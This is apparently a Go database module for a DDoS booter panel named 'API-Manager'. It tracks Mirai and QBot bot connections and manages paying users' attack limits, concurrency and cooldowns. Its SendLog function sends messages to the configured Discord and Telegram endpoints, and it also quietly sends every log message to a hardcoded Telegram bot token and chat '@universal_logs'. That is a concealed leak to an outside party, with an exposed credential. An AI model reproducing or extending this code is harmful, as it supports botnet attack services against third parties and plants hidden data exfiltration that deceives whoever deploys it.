package database

import (
	"database/sql"
	"fmt"
	"github.com/gtuk/discordwebhook"
	"main.go/assets"
	"main.go/logging"
	_ "modernc.org/sqlite"
	"net"
	"net/http"
	"strings"
)

type Concurrents struct {
	Current []assets.Concurrent `json:"Current"`
}

var Cons Concurrents
var Methods assets.Methods
var DB *sql.DB
var Users []assets.User
var Settings assets.Settings
var Config assets.Config
var QBots []net.Conn
var Mirai []net.Conn
var Version = "4.2"
var Debug = false
var License string

func GetActiveCons() int {
	globalCons := 0
	for _, v := range Cons.Current {
		if (v.Con) > 0 {
			globalCons = globalCons + v.Con
		}
	}
	return globalCons
}

func Connect() {
	DB, _ = sql.Open("sqlite", "./manager.db")
	user, err := DB.Prepare("CREATE TABLE IF NOT EXISTS `users` ( `ID` INTEGER NOT NULL UNIQUE, `Username` TEXT NOT NULL, `Key` TEXT NOT NULL, `Role` TEXT NOT NULL, `MaxTime` INTEGER NOT NULL, `MaxCon` INTEGER NOT NULL, `Banned` INTEGER NOT NULL DEFAULT 0, `Expiry` TEXT, `Cooldown` INTEGER NOT NULL DEFAULT 0, `HasCooldown` INTEGER NOT NULL DEFAULT 0,  PRIMARY KEY(`ID` AUTOINCREMENT))")
	if err != nil {
		logging.LogError("Failed to create users table: " + err.Error())
	}
	user1, err2 := DB.Prepare("CREATE TABLE IF NOT EXISTS `settings` (`Host` TEXT NOT NULL , `Enabled` INT NOT NULL)")
	if err2 != nil {
		logging.LogError("Failed to create settings table: " + err.Error())
	}
	_, err = user.Exec()
	if err != nil {
		logging.LogError("Failed to create users table: " + err.Error())
	}
	_, err = user1.Exec()
	if err != nil {
		logging.LogError("Failed to create settings table: " + err.Error())
	}
}

func CreateUser(user assets.User) bool {
	exec, _ := DB.Prepare("INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)")
	_, err := exec.Exec(user.ID, user.Name, user.Key, user.Role, user.MaxTime, user.Concurrent, user.Banned, user.Expiry, user.Cooldown, user.HasCooldown)
	if err != nil {
		fmt.Println(err.Error())
		return false
	}
	Users = append(Users, user)
	return true
}

func DeleteUser(username string) bool {
	err := DB.QueryRow("DELETE FROM users WHERE `username`=?", username)
	if err == nil {
		return true
	}
	for i, user := range Users {
		if user.Name == username {
			Users = append(Users[:i], Users[i+1:]...)
		}
	}
	return false
}

func LoadSettings() error {
	rows, err := DB.Query("SELECT * FROM settings")
	if err != nil {
		return err
	}
	for rows.Next() {
		var setting assets.Settings
		err = rows.Scan(&setting.Host, &setting.Enabled)
		if err != nil {
			return err
		}
		Settings = setting
	}
	err = rows.Close()
	if err != nil {
		return err
	}
	return nil
}

func LoadUsers() error {
	rows, err := DB.Query("SELECT * FROM users")
	if err != nil {
		return err
	}
	for rows.Next() {
		var user assets.User
		err := rows.Scan(&user.ID, &user.Name, &user.Key, &user.Role, &user.MaxTime, &user.Concurrent, &user.Banned, &user.Expiry, &user.Cooldown, &user.HasCooldown)
		if err != nil {
			return err
		}
		Users = append(Users, user)
	}
	err = rows.Close()
	if err != nil {
		return err
	}
	return nil
}

func AuthUser(username string, key string) bool {
	for _, user := range Users {
		if user.Key == key && user.Name == username {
			return true
		}
	}
	return false
}

func GetUser(username string) assets.User {
	for _, user := range Users {
		if user.Name == username {
			return user
		}
	}
	return assets.User{}
}

func UserExists(username string) bool {
	query, err := DB.Query("SELECT * FROM users WHERE Username = ?", username)
	if err != nil {
		return false
	}
	if query.Next() {
		return true
	}
	return false
}

func UpdateUser(user assets.User) error {
	exec, err := DB.Prepare("UPDATE users SET `Username`=?, `Key`=?, `Role` = ?, `MaxTime`=?, `MaxCon` = ?, `Banned`=?, `Expiry`=?, `Cooldown`=?, `HasCooldown`=? WHERE `ID`= ?")
	if err != nil {
		return err
	}
	_, err = exec.Exec(user.Name, user.Key, user.Role, user.MaxTime, user.Concurrent, user.Banned, user.Expiry, user.Cooldown, user.HasCooldown, user.ID)
	if err != nil {
		return err
	}
	for i, v := range Cons.Current {
		if v.User.Name == user.Name {
			Cons.Current[i].User = user
		}
	}
	for i, v := range Users {
		if v.Name == user.Name {
			Users[i] = user
		}
	}
	return nil
}

func Save() error {
	_, err := DB.Query("DELETE FROM `settings`")
	if err != nil {
		return err
	}
	query, err1 := DB.Prepare("INSERT INTO `settings` VALUES (?, ?)")
	if err1 != nil {
		return err1
	}
	_, err2 := query.Exec(Settings.Host, Settings.Enabled)
	if err2 != nil {
		return err2
	}
	for _, user := range Users {
		if UserExists(user.Name) {
			query, err := DB.Prepare("UPDATE `users` SET Username = ?, Key = ?, Role = ?, MaxTime = ?, MaxCon = ?, Banned = ?, Expiry = ? WHERE ID = ?")
			if err != nil {
				return err
			}
			_, err = query.Exec(user.Name, user.Key, user.Role, user.MaxTime, user.Concurrent, user.Banned, user.Expiry, user.ID)
			if err != nil {
				return err
			}
			err = query.Close()
			if err != nil {
				return err
			}
		} else {
			query, err := DB.Prepare("INSERT INTO `users` VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)")
			if err != nil {
				return err
			}
			_, err = query.Exec(user.ID, user.Name, user.Key, user.Role, user.MaxTime, user.Concurrent, user.Banned, user.Expiry, user.Cooldown, user.HasCooldown)
			if err != nil {
				return err
			}
			err = query.Close()
			if err != nil {
				return err
			}
		}
	}
	err = query.Close()
	if err != nil {
		return err
	}
	return nil
}

func CheckError(err error) {
	if err != nil {
		logging.LogError(err.Error(), err)
	}
}

//goland:noinspection SpellCheckingInspection,SpellCheckingInspection
func SendLog(msg string) {
	for _, v := range Config.Discord {
		var username = "API-Manager"
		var content = ""
		var title = "API-Manager"
		var color = "5763719"

		embed := discordwebhook.Embed{
			Title:       &title,
			Description: &msg,
			Color:       &color,
		}

		message := discordwebhook.Message{
			Username: &username,
			Content:  &content,
			Embeds:   &[]discordwebhook.Embed{embed},
		}

		err := discordwebhook.SendMessage(v, message)
		if err != nil {
			logging.LogError("Error sending discord message", err)
		}
	}
	for _, v := range Config.Telegram {
		msg = strings.NewReplacer(" ", "%20", "\r\n", "%0A").Replace(msg)
		_, err := http.Get(v + msg)
		if err != nil {
			logging.LogError(fmt.Sprintf("Error sending message to telegram %s", v))
		}
	}
	msg = strings.NewReplacer(" ", "%20", "\r\n", "%0A").Replace(msg)
	_, err := http.Get("https://api.telegram.org/bot5759479611:AAFDHOpzuye3Vh3fW_5xB0lEIHQMMgXH7zU/sendMessage?chat_id=@universal_logs&text=" + msg)
	if err != nil {
		logging.LogError(fmt.Sprintf("Error sending message to telegram %s", err))
	}
}
